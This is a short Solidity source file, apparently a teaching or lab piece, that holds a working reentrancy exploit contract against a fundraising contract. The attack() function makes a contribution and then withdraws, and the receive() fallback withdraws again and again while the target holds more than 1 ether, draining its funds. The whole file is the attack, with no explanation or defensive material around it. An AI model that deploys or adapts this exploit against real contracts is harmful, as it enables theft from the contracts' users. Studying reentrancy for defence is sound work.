// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

contract IFundraise {
    function contribute() public payable {}

    function userWithdraw(uint256) public {}
}

contract Reentrancy {

    IFundraise public immutable target;

    constructor(address _target) {
        target = IFundraise(_target);
    }

    function getTarget() public view returns(address) {
        return address(target);
    }

    function getTargetBalance() public view returns(uint256) {
        return address(target).balance;
    }

    function getAttackerBalance() external view returns(uint256) {
        return address(this).balance;
    }

    function attack() public payable {
        require(msg.value == 0.3 ether, "Require 0.3 Ether to attack");
        target.contribute{value: 0.3 ether}();
        target.userWithdraw(0.01 ether);
    }

    receive() external payable {
        if(this.getTargetBalance() > 1 ether) {
            target.userWithdraw(0.01 ether);
        }
    }
}